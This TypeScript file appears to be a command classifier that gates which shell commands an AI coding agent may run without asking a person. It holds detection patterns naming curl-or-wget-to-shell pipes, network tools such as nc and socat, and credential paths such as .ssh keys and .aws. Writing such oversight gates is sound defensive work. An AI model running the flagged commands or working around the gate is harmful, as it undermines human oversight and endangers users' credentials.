import { realpathSync } from 'node:fs';
import * as path from 'node:path';
import { plainDownload } from '../domain/plainDownload';
import { normalizeRelative, PROTECTED_WRITE, STATE_FOLDER_PATH, STATE_FOLDER_TEXT } from '../domain/protectedPaths';
import { parsePathPattern } from '../domain/gate/vocabulary';
import type { Capability, PublishTarget } from '../domain/gate/vocabulary';
import { isSensitivePath } from './tools';

// The deterministic half of the `auto` approval mode. It decides the clear cases on its own:
// ordinary build, test, and read-only commands inside the workspace are `safe`; commands that can
// destroy work, publish, send data out, escalate privileges, or touch credentials are `risky`.
// Everything else is `unknown` and goes to the safety model. It parses conservatively: anything it
// cannot fully account for (substitutions, variables, globs, here-documents, odd wrappers) is
// never `safe`.

export type CommandVerdict = 'safe' | 'risky' | 'unknown';

/**
 * What a command does that the gate's floor must see (GATE-05, D-17, D-46), as a vocabulary capability rather than words in a reason (research 4.1): it
 * publishes (or sends), it destroys, or it writes a protected place. Paths are project-relative; `**` stands for the whole tree or anything outside it.
 */
export type CommandEffect = Extract<Capability, { verb: 'publish' | 'send' | 'destroy' | 'workspaceWrite' | 'network' }>;

export interface CommandClassification {
  verdict: CommandVerdict;
  reason: string;
  /**
   * Every effect the command shows, wherever it sits: inside a script `npm run` runs, after `&&`, in a substitution, under `bash -c`. Absent when there is
   * none. It never changes the verdict or the reason; it only says what the command would do.
   */
  effects?: CommandEffect[];
  /**
   * Set, with the reason, when the classifier did not read the whole command: it nests deeper than MAX_NESTING, or it is longer than MAX_COMMAND_LENGTH
   * or has more than MAX_COMMAND_WORDS words. `effects` is then only what was read before it stopped, not all the command does, so the gate must treat
   * the command's effects as unknown (it asks with a person there and refuses with nobody), never as "none" (PR #74 review).
   */
  effectsUnknown?: string;
}

/** How many levels deep the classifier reads a command inside another (a wrapper, a script, a substitution, an inline shell). One bound for every path. */
export const MAX_NESTING = 4;
/** A command longer than this is not read at all: its effects are unknown. Reading is linear but not free, and the extension host waits for it. */
export const MAX_COMMAND_LENGTH = 100_000;
/**
 * A command line (or a script it runs) with more words than this is not read: a word can be resolved as a path, so the cost grows with the words (about
 * a third of a second at the cap). Well above ordinary work: a 1,500-line here-document, whose text the lexer reads as words, is about 6,000.
 */
export const MAX_COMMAND_WORDS = 10_000;

export interface CommandContext {
  /** The workspace root (absolute). */
  root: string;
  /** The shell's working directory when the command runs (absolute); defaults to `root`. */
  cwd?: string;
  /** The user's home directory, for `~` and a bare `cd`. */
  home?: string;
  /** The workspace package.json scripts, so `npm run x` can be checked against what x runs. */
  packageScripts?: Record<string, string>;
  /**
   * Absolute roots of tools the extension installed and verified itself: the managed Open-GSD
   * runtime. Its gsd-tools may run and its files may be read; nothing may be written there.
   * A user-level install (~/.claude, …) is never one of these.
   */
  trustedToolRoots?: string[];
  /** Open-GSD preambles shipped in the managed runtime (exact text); see src/gsd/preamble.ts. */
  gsdPreambles?: string[];
  /**
   * 0.4.18: absolute paths of scratch files THIS RUN wrote (its own writes into a temporary folder). Only these may be run by an interpreter without
   * asking; a file that merely sits in a temporary folder may have been put there by a web page the run read, so it is not code the run may execute.
   */
  writtenScratch?: string[];
  /** The managed Open-GSD home the runtime check verified (0.4.18: lets an inline prologue's variables be resolved to real paths). */
  /** Whether `gsd_run` as such a preamble defines it would run the managed runtime's gsd-tools, checked for this shell. */
  gsdRun?: { trusted: boolean; reason?: string };
  /** Set while classifying what follows a trusted preamble: `gsd_run` is the managed gsd-tools. */
  gsdRunDefined?: boolean;
  /**
   * The system's temporary folders, absolute, as the caller resolved them (the temporary folder, its real path, and TMPDIR when set: systemTemporaryRoots in
   * the gate adapter). Given, the classifier reads no environment for them; absent, it falls back to `/tmp`, `/var/tmp` and TMPDIR, as it always has. A
   * delete inside one (not of the folder itself, nor of a folder holding the project or the home folder) is scratch work, not destruction (PR #74 review).
   */
  temporaryRoots?: readonly string[];
  /**
   * Whether one simple command (plain words, no operators) is on the user's allow list
   * (nearAi.agent.allowCommands, including "always allow" choices). Each part of a chained
   * command is checked on its own, so `cd app && git push` is covered by "git push".
   */
  isAllowListed?(command: string): boolean;
}

// Effects are gathered for the whole classifyCommand call, not handed back result by result: the classifier often rebuilds a result from an inner one
// (`npm run x`, `xargs`, `find -exec`, a substitution) or decides on one part and stops, and a tag carried by hand through each of those would be lost in the
// next one somebody writes (Pitfall 2). Classification is synchronous, so the frame on top of this stack is always the call being made.
// The frame also keeps whether the classifier stopped reading somewhere (the bound, the caps): wherever that happens, the whole command's effects are unknown.
interface EffectFrame { effects: CommandEffect[]; unknown?: string }
const effectFrames: EffectFrame[] = [];

function noteEffects(effects: readonly CommandEffect[] | undefined): void {
  const frame = effectFrames[effectFrames.length - 1];
  if (frame !== undefined && effects !== undefined) frame.effects.push(...effects);
}

/** Where the current frame ends now, so a caller can see what one inner classification added. */
function effectMark(): number {
  return effectFrames[effectFrames.length - 1]?.effects.length ?? 0;
}

function effectsSince(mark: number): readonly CommandEffect[] {
  return effectFrames[effectFrames.length - 1]?.effects.slice(mark) ?? [];
}

/**
 * The classifier stops reading here. The verdict is unknown, and the command's effects are unknown too: what it has found so far is not everything the
 * command does, so the gate must not read the tags it has as the whole story (fail closed, PR #74 review).
 */
function beyondReach(reason: string): CommandClassification {
  const frame = effectFrames[effectFrames.length - 1];
  if (frame !== undefined) frame.unknown ??= reason;
  return unknown(reason);
}

/** The one nesting bound, checked first by both entry points every recursive path goes through (classifyText and classifyWords). */
function tooDeep(depth: number): CommandClassification | undefined {
  return depth > MAX_NESTING ? beyondReach('the command nests too deeply to check') : undefined;
}

function classification(verdict: CommandVerdict, reason: string, effects?: readonly CommandEffect[]): CommandClassification {
  noteEffects(effects);
  return effects !== undefined && effects.length > 0 ? { verdict, reason, effects: [...effects] } : { verdict, reason };
}

const safe = (reason: string): CommandClassification => ({ verdict: 'safe', reason });
const risky = (reason: string, effects?: readonly CommandEffect[]): CommandClassification => classification('risky', reason, effects);
const unknown = (reason: string, effects?: readonly CommandEffect[]): CommandClassification => classification('unknown', reason, effects);

/** One copy of each effect, in the order first seen. */
function distinctEffects(effects: readonly CommandEffect[]): CommandEffect[] {
  const seen = new Set<string>();
  const out: CommandEffect[] = [];
  for (const effect of effects) {
    const key = JSON.stringify(effect);
    if (seen.has(key)) continue;
    seen.add(key);
    out.push(effect);
  }
  return out;
}

const publishTo = (target: PublishTarget): CommandEffect[] => [{ verb: 'publish', target }];
/** The whole tree: a delete or rewrite the classifier cannot narrow to named paths (history, a branch, every match of a find). */
const DESTROY_ALL: CommandEffect[] = [{ verb: 'destroy', paths: ['**'] }];

/** One copy of each path; `**` alone when any of them is the whole tree. */
function effectPaths(paths: readonly string[]): string[] {
  if (paths.length === 0 || paths.includes('**')) return ['**'];
  return [...new Set(paths)];
}

const destroyPaths = (paths: readonly string[]): CommandEffect[] => [{ verb: 'destroy', paths: effectPaths(paths) }];
const writePaths = (paths: readonly string[]): CommandEffect[] => (paths.length ? [{ verb: 'workspaceWrite', paths: effectPaths(paths) }] : []);

// ---------------------------------------------------------------------------------------------
// Lexing

interface Word {
  /** The word after quote removal. */
  text: string;
  /** Any part of it was quoted or escaped. */
  quoted: boolean;
  /** Unquoted glob or brace characters the shell would expand. */
  glob: boolean;
  /** `$VAR`, `${...}`, `$(...)`, or backticks: the shell decides its value at run time. */
  expansion: boolean;
}

interface Redirect { op: string; target?: Word; fd?: string }

interface Segment {
  words: Word[];
  redirects: Redirect[];
  /** The operator that joins this segment to the next (`&&`, `||`, `;`, `|`, `|&`, `&`), if any. */
  next?: string;
  /** The operator that joined the previous segment to this one. */
  previous?: string;
}

interface Lexed {
  segments: Segment[];
  /** Command text inside `$(...)`, backticks, and `<(...)`/`>(...)`. */
  substitutions: string[];
  /** Why the command cannot be fully accounted for, when it cannot. */
  opaque?: string;
  /** Unterminated quotes or substitutions: the structure itself is unknown. */
  broken?: string;
}

const GLOB_CHARS = new Set(['*', '?', '[', '{']);

/** Finds the end of a `$(`/`<(` group starting after the opening parenthesis; -1 when unterminated. */
function matchParen(text: string, start: number): number {
  let depth = 1;
  let quote: string | undefined;
  for (let index = start; index < text.length; index += 1) {
    const char = text[index];
    if (quote) {
      if (char === '\\' && quote === '"') { index += 1; continue; }
      if (char === quote) quote = undefined;
      continue;
    }
    if (char === '\\') { index += 1; continue; }
    if (char === '\'' || char === '"') { quote = char; continue; }
    if (char === '(') depth += 1;
    else if (char === ')') { depth -= 1; if (depth === 0) return index; }
  }
  return -1;
}

function lex(command: string): Lexed {
  const segments: Segment[] = [];
  const substitutions: string[] = [];
  let opaque: string | undefined;
  const markOpaque = (reason: string) => { opaque = opaque ?? reason; };
  let segment: Segment = { words: [], redirects: [] };
  let word: Word | undefined;
  let pendingRedirect: Redirect | undefined;
  const startWord = () => { word = word ?? { text: '', quoted: false, glob: false, expansion: false }; return word; };
  const endWord = () => {
    if (!word) return;
    if (pendingRedirect) { pendingRedirect.target = word; segment.redirects.push(pendingRedirect); pendingRedirect = undefined; }
    else segment.words.push(word);
    word = undefined;
  };
  const endSegment = (operator?: string) => {
    endWord();
    if (pendingRedirect) return 'a redirect has no target';
    if (segment.words.length || segment.redirects.length) {
      segment.next = operator;
      segments.push(segment);
    } else if (operator && operator !== ';' && operator !== '\n') return `"${operator}" has no command before it`;
    segment = { words: [], redirects: [], previous: operator };
    return undefined;
  };
  /** Handles `$` at `index` (inside double quotes when `inDouble`); returns the index of the last consumed character. */
  const dollar = (index: number, inDouble: boolean): number | { broken: string } => {
    const next = command[index + 1];
    const current = startWord();
    if (next === '(') {
      const close = matchParen(command, index + 2);
      if (close < 0) return { broken: 'an unterminated $( substitution' };
      substitutions.push(command.slice(command[index + 2] === '(' ? index + 3 : index + 2, close));
      current.expansion = true;
      markOpaque('it uses command substitution, whose output the shell decides at run time');
      return close;
    }
    if (next === '{' || (next !== undefined && /[A-Za-z0-9_@*#?$!-]/.test(next))) {
      current.expansion = true;
      markOpaque('it uses a shell variable, whose value the shell decides at run time');
      if (next === '{') {
        const close = command.indexOf('}', index + 2);
        if (close < 0) return { broken: 'an unterminated ${' };
        return close;
      }
      let end = index + 1;
      if (/[A-Za-z_]/.test(next)) while (end + 1 < command.length && /[A-Za-z0-9_]/.test(command[end + 1])) end += 1;
      return end;
    }
    if (next === '\'' && !inDouble) { markOpaque('it uses $\'…\' quoting'); }
    current.text += '$';
    return index;
  };

  for (let index = 0; index < command.length; index += 1) {
    const char = command[index];
    if (char === '\\') {
      if (index + 1 >= command.length) return { segments, substitutions, broken: 'a trailing backslash' };
      if (command[index + 1] === '\n') { index += 1; continue; }
      const current = startWord();
      current.text += command[index + 1];
      current.quoted = true;
      index += 1;
      continue;
    }
    if (char === '\'') {
      const close = command.indexOf('\'', index + 1);
      if (close < 0) return { segments, substitutions, broken: 'an unterminated single quote' };
      const current = startWord();
      current.text += command.slice(index + 1, close);
      current.quoted = true;
      index = close;
      continue;
    }
    if (char === '"') {
      const current = startWord();
      current.quoted = true;
      let closed = false;
      for (index += 1; index < command.length; index += 1) {
        const inner = command[index];
        if (inner === '"') { closed = true; break; }
        if (inner === '\\' && index + 1 < command.length && '$`"\\\n'.includes(command[index + 1])) { current.text += command[index + 1]; index += 1; continue; }
        if (inner === '$') {
          const consumed = dollar(index, true);
          if (typeof consumed !== 'number') return { segments, substitutions, broken: consumed.broken };
          index = consumed;
          continue;
        }
        if (inner === '`') {
          const close = command.indexOf('`', index + 1);
          if (close < 0) return { segments, substitutions, broken: 'an unterminated backtick' };
          substitutions.push(command.slice(index + 1, close));
          current.expansion = true;
          markOpaque('it uses command substitution, whose output the shell decides at run time');
          index = close;
          continue;
        }
        current.text += inner;
      }
      if (!closed) return { segments, substitutions, broken: 'an unterminated double quote' };
      continue;
    }
    if (char === '`') {
      const close = command.indexOf('`', index + 1);
      if (close < 0) return { segments, substitutions, broken: 'an unterminated backtick' };
      substitutions.push(command.slice(index + 1, close));
      startWord().expansion = true;
      markOpaque('it uses command substitution, whose output the shell decides at run time');
      index = close;
      continue;
    }
    if (char === '$') {
      const consumed = dollar(index, false);
      if (typeof consumed !== 'number') return { segments, substitutions, broken: consumed.broken };
      index = consumed;
      continue;
    }
    if (char === '#' && !word) {
      // A comment runs to the end of the line.
      const end = command.indexOf('\n', index);
      index = end < 0 ? command.length : end - 1;
      continue;
    }
    if (char === ' ' || char === '\t') { endWord(); continue; }
    if (char === '\n' || char === '\r') { const problem = endSegment(';'); if (problem) return { segments, substitutions, broken: problem }; continue; }
    if ((char === '<' || char === '>') && command[index + 1] === '(') {
      const close = matchParen(command, index + 2);
      if (close < 0) return { segments, substitutions, broken: 'an unterminated process substitution' };
      substitutions.push(command.slice(index + 2, close));
      startWord().expansion = true;
      markOpaque('it uses process substitution');
      index = close;
      continue;
    }
    if (char === '<' || char === '>') {
      // An all-digit word right before the operator is a file descriptor (2>, 1>>).
      let fd: string | undefined;
      if (word && !word.quoted && /^\d+$/.test(word.text)) { fd = word.text; word = undefined; }
      else endWord();
      if (pendingRedirect) return { segments, substitutions, broken: 'a redirect has no target' };
      let op = char;
      if (char === '<' && command[index + 1] === '<') {
        markOpaque('it uses a here-document');
        op = command[index + 2] === '<' ? '<<<' : '<<';
        index += op.length - 1;
        pendingRedirect = { op, fd };
        continue;
      }
      if (char === '>' && (command[index + 1] === '>' || command[index + 1] === '|')) { op += command[index + 1]; index += 1; }
      else if (char === '<' && command[index + 1] === '>') { op = '<>'; index += 1; }
      if (command[index + 1] === '&') {
        // >&2, 2>&1, <&0: duplicating a descriptor writes no file; >&file is a file redirect.
        let end = index + 2;
        while (end < command.length && /[0-9-]/.test(command[end])) end += 1;
        if (end > index + 2) { segment.redirects.push({ op: `${op}&`, fd, target: { text: command.slice(index + 2, end), quoted: false, glob: false, expansion: false } }); index = end - 1; continue; }
        op += '&';
        index += 1;
      }
      pendingRedirect = { op, fd };
      continue;
    }
    if (char === '&' && command[index + 1] === '>') {
      endWord();
      const append = command[index + 2] === '>';
      pendingRedirect = { op: append ? '&>>' : '&>' };
      index += append ? 2 : 1;
      continue;
    }
    if (char === '|' || char === '&' || char === ';') {
      let op: string = char;
      if ((char === '|' && (command[index + 1] === '|' || command[index + 1] === '&')) || (char === '&' && command[index + 1] === '&') || (char === ';' && command[index + 1] === ';')) { op += command[index + 1]; index += 1; }
      if (op === '&') markOpaque('it starts a background job');
      if (op === ';;') return { segments, substitutions, broken: 'a case statement' };
      const problem = endSegment(op);
      if (problem) return { segments, substitutions, broken: problem };
      continue;
    }
    if (char === '(' || char === ')') {
      // Subshells and groups: their commands are still checked, but the whole is never `safe`.
      markOpaque('it runs a subshell');
      const problem = endSegment(';');
      if (problem) return { segments, substitutions, broken: problem };
      continue;
    }
    const current = startWord();
    if (GLOB_CHARS.has(char) || (char === '~' && !current.text)) {
      if (char === '~') current.text += '~';
      else { current.glob = true; current.text += char; }
      continue;
    }
    current.text += char;
  }
  const problem = endSegment();
  if (problem) return { segments, substitutions, broken: problem };
  // A trailing operator (`ls &&`) leaves the shell waiting for more.
  const last = segments.at(-1);
  if (last?.next && last.next !== ';' && last.next !== '&') return { segments, substitutions, broken: `the command ends with "${last.next}"` };
  return { segments, substitutions, opaque };
}

// ---------------------------------------------------------------------------------------------
// Paths

interface PathFacts { absolute: string; inside: boolean; sensitive: boolean; protectedWrite: boolean; device: boolean; trusted: boolean; scratch: boolean }

const DEVICES = new Set(['/dev/null', '/dev/stdout', '/dev/stderr', '/dev/tty']);
/** Credential and knowledge-base files, on top of the file tools' credential patterns. */
const KB_OR_SECRET = new RegExp(`(?:^|\\/)(?:\\.near-credentials|\\.near-kb|\\.ssh|\\.aws|\\.gnupg|\\.kube|\\.docker\\/config\\.json)(?:\\/|$)|\\.kbkey$|(?:^|\\/)state\\.vscdb(?:\\.backup)?$|(?:^|\\/)\\.git-credentials$|${STATE_FOLDER_PATH.source}`, 'i');

function isInside(root: string, absolute: string): boolean {
  const relative = path.relative(root, absolute);
  return relative === '' || (!relative.startsWith('..') && !path.isAbsolute(relative));
}

function pathFacts(text: string, cwd: string, context: CommandContext): PathFacts {
  const home = context.home;
  let expanded = text;
  if (text === '~' || text.startsWith('~/')) expanded = home ? path.join(home, text.slice(1)) : '/~unknown-home';
  const absolute = path.resolve(cwd, expanded);
  const relative = path.relative(context.root, absolute).split(path.sep).join('/');
  const inside = isInside(context.root, absolute);
  const sensitive = isSensitivePath(text) || isSensitivePath(absolute) || KB_OR_SECRET.test(text) || KB_OR_SECRET.test(absolute.split(path.sep).join('/'));
  const trusted = trustedRoots(context).some((trustedRoot) => isInside(trustedRoot, absolute));
  // 0.4.18 review: a symlink in a temporary folder can point anywhere, so `/tmp/x/id_rsa` (or `/tmp/x` -> `~/.ssh`) would have looked like scratch
  // and made a credential read safe. The real path decides: a link that lands outside the temporary folders, or on a credential path, is not scratch.
  const real = realPathOrSelf(absolute);
  const realSensitive = real !== absolute && (isSensitivePath(real) || KB_OR_SECRET.test(real.split(path.sep).join('/')));
  const scratch = scratchFacts(text, absolute, sensitive, context) && scratchFacts(real, real, sensitive || realSensitive, context);
  return { absolute, inside, sensitive: sensitive || realSensitive, protectedWrite: inside && PROTECTED_WRITE.test(normalizeRelative(relative)), device: DEVICES.has(absolute), trusted, scratch };
}

/**
 * A path as an effect names it: project-relative inside the workspace, or `**` for the workspace itself, anywhere outside it, or a path the shell decides
 * at run time. Always a pattern the vocabulary accepts.
 */
function effectPath(word: Word | string, state: SegmentState, context: CommandContext): string {
  if (typeof word !== 'string' && word.expansion) return '**';
  const text = typeof word === 'string' ? word : valuePart(word.text);
  const facts = pathFacts(text, state.cwd, context);
  if (!facts.inside) return '**';
  const parsed = parsePathPattern(path.relative(path.resolve(context.root), facts.absolute).split(path.sep).join('/'), 'path');
  return parsed.ok ? parsed.value : '**';
}

/** Whether a path the command writes is one of the places where writes always ask (D-44: the floor itself exempts team.md, as the file tools do). */
function protectedWriteEffects(words: readonly Word[], state: SegmentState, context: CommandContext): CommandEffect[] {
  const paths = words.filter((word) => !word.expansion && !looksLikeOption(word.text) && pathFacts(word.text, state.cwd, context).protectedWrite).map((word) => effectPath(word, state, context));
  return writePaths(paths);
}

/**
 * The system's temporary folders, accepted as scratch space (owner, 2026-11-06: "accept it if gsd does keep using /tmp while also ensuring it's
 * safe"). Open-GSD's own workflows write helper scripts to /tmp and run them there, and holding every such step stopped a run for no real risk: /tmp
 * is a throwaway folder that the system empties itself.
 *
 * The boundary is what keeps it safe: a path is scratch only when it is named absolutely (so nothing depends on where a relative path resolves), has
 * no `..` in it (so it cannot climb to a parent), and is not a credential or knowledge-base path. `/tmp`, `/var/tmp` and the per-user temp folder
 * count; `/dev/shm`, the home folder and anything else on the machine do not.
 */
/** The path a file really is, following symlinks, or the path itself when it does not exist (a write target). */
function realPathOrSelf(target: string): string {
  try { return realpathSync(target); } catch { return target; }
}

/** The temporary folders the caller named, or the old fallback (`/tmp`, `/var/tmp`, TMPDIR) for a caller that names none. Absolute, unfiltered. */
function temporaryCandidates(context: CommandContext): string[] {
  const given = context.temporaryRoots;
  if (given !== undefined) return given.filter((entry) => entry !== '' && path.isAbsolute(entry)).map((entry) => path.resolve(entry));
  return ['/tmp', '/var/tmp', ...(process.env.TMPDIR ? [process.env.TMPDIR] : [])].map((entry) => path.resolve(entry));
}

function scratchRoots(context: CommandContext): string[] {
  // 0.4.18 review: the run is told to keep its helpers in the project's own scratch folder (.near-ai/scratch/), so that folder must count as scratch
  // too. It is inside the workspace, so it is already allowed for reads and writes; this makes a SCRIPT there runnable once the run itself wrote it.
  const projectScratch = path.join(path.resolve(context.root), '.near-ai', 'scratch');
  const home = context.home ? path.resolve(context.home) : undefined;
  const root = path.resolve(context.root);
  const candidates = temporaryCandidates(context);
  // 0.4.18 review: TMPDIR comes from the extension's own environment, so a TMPDIR of the home folder or of `/` would make the whole home or the whole
  // filesystem "scratch". A root is accepted only when it is a real temporary folder: not `/`, not the home folder, not the workspace, and not an
  // ancestor of either.
  const real = candidates.filter((candidate) => {
    if (candidate === path.parse(candidate).root) return false;
    for (const mustNotContain of [home, root]) {
      if (mustNotContain !== undefined && isInside(candidate, mustNotContain)) return false;
    }
    return true;
  });
  return [...real, projectScratch];
}

function scratchFacts(text: string, absolute: string, sensitive: boolean, context: CommandContext): boolean {
  if (sensitive) return false;
  // A relative name is scratch only when it resolves inside a temporary folder, which is the `cd /tmp && python3 verify.py` case: the text is not
  // absolute, but where it lands is. A `..` anywhere in the command's own text is refused, so a relative name cannot climb out.
  if (text.split(/[\\/]/).includes('..')) return false;
  return scratchRoots(context).some((root) => absolute === root || isInside(root, absolute));
}

/** The trusted tool roots, absolute and normalised; relative or empty entries are ignored. */
function trustedRoots(context: CommandContext): string[] {
  return (context.trustedToolRoots ?? []).filter((root) => root && path.isAbsolute(root)).map((root) => path.resolve(root));
}

/** Open-GSD's command-line tool inside a trusted root: gsd-tools.cjs or the gsd_run launcher beside it. */
function isTrustedGsdTool(word: Word | undefined, state: SegmentState, context: CommandContext): boolean {
  if (!word || word.expansion || word.glob || word.text.startsWith('-')) return false;
  const facts = pathFacts(word.text, state.cwd, context);
  return trustedRoots(context).some((trustedRoot) => ['gsd-tools.cjs', 'gsd_run'].some((file) => facts.absolute === path.join(trustedRoot, 'gsd-core', 'bin', file)));
}

/**
 * A wildcard that can only match inside the workspace: a relative pattern with no `..`, no braces
 * (which can name any path), and no wildcard in a dot-name (`.*` can match `..`).
 */
function isWorkspaceGlob(word: Word, state: SegmentState, context: CommandContext): boolean {
  const value = valuePart(word.text);
  if (word.expansion || value.startsWith('/') || value.startsWith('~') || value.includes('{')) return false;
  const parts = value.split('/');
  if (parts.some((part) => part === '..' || (part.startsWith('.') && /[*?[]/.test(part)))) return false;
  const facts = pathFacts(value, state.cwd, context);
  return facts.inside && !facts.sensitive;
}

/** The value of `--opt=value`, or the word itself. */
function valuePart(text: string): string {
  const match = /^--?[A-Za-z0-9][\w-]*=(.*)$/.exec(text);
  return match ? match[1] : text;
}

const looksLikeOption = (text: string) => /^-/.test(text) && text !== '-' && text !== '--';

/** The raw text names a credential or knowledge-base path anywhere (also inside quotes and substitutions). */
const SENSITIVE_TEXT_BASE = /\.near-credentials|\.near-kb\b|\.kbkey\b|state\.vscdb|(?:^|[\s/'"=:])\.ssh(?:\/|\b)|(?:^|[\s/'"=:])\.aws(?:\/|\b)|(?:^|[\s/'"=:<>])\.env(?:\.[\w.-]+)?(?=$|[\s'"/;&|)<>])|\bid_(?:rsa|dsa|ecdsa|ed25519)\b|\.git-credentials|\.netrc\b|\.npmrc\b|\.pypirc\b/i;
/** Plus the project's state folder (its keys must not reach a model request through a recursive read or a copy). */
const SENSITIVE_TEXT = new RegExp(`${SENSITIVE_TEXT_BASE.source}|${STATE_FOLDER_TEXT.source}`, 'i');
const DOWNLOAD_TO_SHELL = /\b(?:curl|wget|fetch)\b[^\n;&]*\|\s*(?:sudo\s+)?(?:env\s+\S+\s+)?(?:ba|z|da|k|fi|c)?sh\b|\b(?:curl|wget)\b[^\n;&]*\|\s*(?:sudo\s+)?(?:python[0-9.]*|node|perl|ruby|php)\b|\b(?:ba|z|da|k)?sh\s+(?:-c\s+)?["']?(?:\$\(|`|<\()\s*(?:curl|wget)\b|\beval\s+["']?(?:\$\(|`)\s*(?:curl|wget)\b|\b(?:source|\.)\s+<\(\s*(?:curl|wget)\b/i;

// ---------------------------------------------------------------------------------------------
// Commands

const INTERPRETERS = new Set(['sh', 'bash', 'zsh', 'dash', 'ksh', 'fish', 'csh', 'tcsh', 'python', 'python2', 'python3', 'node', 'perl', 'ruby', 'php', 'pwsh', 'powershell', 'eval', 'source', '.', 'xargs', 'deno', 'bun']);
const PRIVILEGE = new Set(['sudo', 'su', 'doas', 'pkexec', 'runas']);
const DISK_DESTROYERS = new Set(['shred', 'truncate', 'dd', 'wipefs', 'fdisk', 'sfdisk', 'parted', 'mkswap', 'blkdiscard', 'srm']);
const NETWORK_SENDERS = new Set(['nc', 'ncat', 'netcat', 'socat', 'telnet', 'ftp', 'sftp', 'ssh', 'scp', 'tftp']);
const DELETERS = new Set(['rm', 'rmdir', 'unlink', 'shred', 'srm', 'truncate']);
const POWER = new Set(['shutdown', 'reboot', 'halt', 'poweroff']);
/** Reads files and prints; never writes or runs anything (with the option checks below). */
const READ_ONLY = new Set(['ls', 'cat', 'head', 'tail', 'wc', 'grep', 'egrep', 'fgrep', 'rg', 'pwd', 'echo', 'printf', 'true', 'false', 'which', 'file', 'stat', 'du', 'tree', 'sort', 'uniq', 'cut', 'tr', 'diff', 'cmp', 'basename', 'dirname', 'realpath', 'readlink', 'date', 'jq', 'nl', 'column', 'od', 'xxd', 'hexdump', 'sha256sum', 'sha1sum', 'md5sum', 'shasum', 'comm', 'paste', 'fold', 'rev', 'tac', 'test', '[', 'whoami', 'uname', 'seq', 'sleep', 'ps', 'pgrep', 'df', 'free', 'nproc', 'id', 'hostname', 'uptime', 'groups']);
/** Folders a build, test run, or install regenerates; `rm -rf` of one inside the workspace runs without asking. */
const BUILD_OUTPUT = new Set(['dist', 'build', 'out', 'coverage', 'node_modules', '.next', '.nuxt', '.turbo', '.parcel-cache', '.vite', 'target', '__pycache__', '.pytest_cache', '.mypy_cache', '.ruff_cache', '.cache', '.vscode-test', '.nyc_output']);
/** Installing what the lockfile already declares: no package names, only these options. */
const LOCKFILE_INSTALL_OPTIONS = /^--(?:frozen-lockfile|immutable|prefer-offline|offline|no-audit|no-fund|no-progress|silent|quiet|legacy-peer-deps|ignore-scripts|include=\w+|omit=\w+|production|prod|check-files|loglevel=\w+)$|^-(?:s|q)$/;
/** Writes inside the workspace only (every path argument is checked). */
const WORKSPACE_WRITERS = new Set(['mkdir', 'touch', 'cp', 'mv', 'tee']);
/** Test, build, lint, and type-check tools that are run directly or through npx. */
const DEV_TOOLS = new Set(['tsc', 'eslint', 'prettier', 'jest', 'vitest', 'mocha', 'pytest', 'ruff', 'mypy', 'flake8', 'black', 'isort', 'pylint', 'tsx']);
/** Environment variables that only change output or test settings. */
const HARMLESS_ENV = new Set(['CI', 'NODE_ENV', 'FORCE_COLOR', 'NO_COLOR', 'DEBUG', 'TZ', 'LANG', 'LC_ALL', 'RUST_BACKTRACE', 'PYTHONDONTWRITEBYTECODE', 'PYTHONUNBUFFERED', 'TERM', 'COLUMNS']);
const RELEASE_NAME = /(?:^|[:_-])(?:publish|release|deploy|ship|upload|push)(?:$|[:_-])/i;
/** Where each publishing tool publishes to, for its effect tag (D-46). A tool not listed here that the rules call a release is a `release`. */
const PUBLISH_TOOL_TARGETS: Readonly<Record<string, PublishTarget>> = Object.freeze({
  vsce: 'registry', '@vscode/vsce': 'registry', ovsx: 'registry', twine: 'registry', gem: 'registry',
  vercel: 'deploy', netlify: 'deploy', firebase: 'deploy', wrangler: 'deploy', fly: 'deploy', flyctl: 'deploy', heroku: 'deploy', 'gh-pages': 'deploy',
  serverless: 'deploy', sls: 'deploy', cdk: 'deploy',
  'semantic-release': 'release', 'release-it': 'release', np: 'release', changeset: 'release', lerna: 'release'
});
/** Shell keywords and wrappers that run the words after them: what those words do is read for effects; the verdict is the rules' own. */
const RUNS_WHAT_FOLLOWS = new Set(['{', '!', 'if', 'then', 'else', 'elif', 'while', 'until', 'do', 'exec', 'setsid']);
/** sudo, doas and pkexec options that take a value. */
const PRIVILEGE_VALUE_OPTIONS = new Set(['-u', '-g', '-C', '-h', '-p', '-U', '-r', '-t', '-T', '-D', '-R', '--user', '--group', '--close-from', '--host', '--prompt', '--other-user', '--role', '--type', '--command-timeout', '--chdir', '--chroot']);
/** Shells whose `-c` script is read for what it does (fish and the csh family too: their scripts are read as sh, which is enough to see a push). */
const SHELLS = new Set(['sh', 'bash', 'zsh', 'dash', 'ksh', 'fish', 'csh', 'tcsh']);

interface SegmentState { cwd: string }

const XARGS_VALUE_OPTIONS = new Set(['-n', '-L', '-P', '-I', '-d', '-s', '-E', '-a', '--max-args', '--max-lines', '--max-procs', '--delimiter', '--arg-file', '--replace', '--eof']);

/** The command xargs runs, after its own options. */
function xargsCommand(args: Word[]): Word[] {
  let index = 0;
  while (index < args.length && looksLikeOption(args[index].text)) index += XARGS_VALUE_OPTIONS.has(args[index].text) ? 2 : 1;
  return args.slice(index);
}

function programName(text: string): string { return text.includes('/') ? text.slice(text.lastIndexOf('/') + 1) : text; }

/**
 * Checks the path arguments of a read-only command: credentials are risky, anything outside the
 * workspace is unknown. With `allowTrusted`, paths inside a trusted tool root may be read too.
 */
function checkReads(args: Word[], state: SegmentState, context: CommandContext, label: string, allowTrusted = false): CommandClassification {
  let readsTrusted = false;
  let scratchRead = false;
  for (const arg of args) {
    // --opt=value and -X/attached/value name paths too.
    const attached = /^-[A-Za-z]([/~.].*)$/.exec(arg.text)?.[1];
    const value = attached ?? valuePart(arg.text);
    if (!value || (looksLikeOption(arg.text) && value === arg.text)) continue;
    const facts = pathFacts(value, state.cwd, context);
    if (facts.sensitive) return risky(`${label} reads ${value}, which may hold credentials or knowledge-base keys`);
    if (allowTrusted && facts.trusted && !facts.inside) { readsTrusted = true; continue; }
    // 0.4.18: a file in the system's temporary folder is accepted scratch work, which is where Open-GSD's helper scripts and their data live.
    if (facts.scratch) { scratchRead = true; continue; }
    if (!facts.inside && !facts.device) return unknown(`${label} names ${value}, which is outside the workspace`);
  }
  if (scratchRead) return safe(`${label} reads inside the workspace and a temporary folder`);
  // 0.4.18: the trusted roots are the managed Open-GSD runtime and the person's own team library, both of which NEAR AI installed or wrote.
  return safe(readsTrusted ? `${label} only reads inside the workspace and the files NEAR AI installed for this project and its teams` : `${label} only reads inside the workspace`);
}

/** gsd-tools verbs that act outside the workspace or contact the network. */
const GSD_RISKY_VERBS = new Set(['pr-subrepo', 'commit-to-subrepo']);
